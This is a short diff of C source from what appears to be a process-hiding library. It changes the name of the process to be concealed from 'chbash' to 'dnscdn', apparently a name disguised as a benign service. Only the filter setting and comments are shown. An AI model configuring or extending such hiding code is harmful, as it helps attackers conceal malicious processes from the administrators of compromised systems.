@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "chbash";
+static const char* process_to_filter = "dnscdn";
 
 /*
  * Get a directory name given a DIR* handle
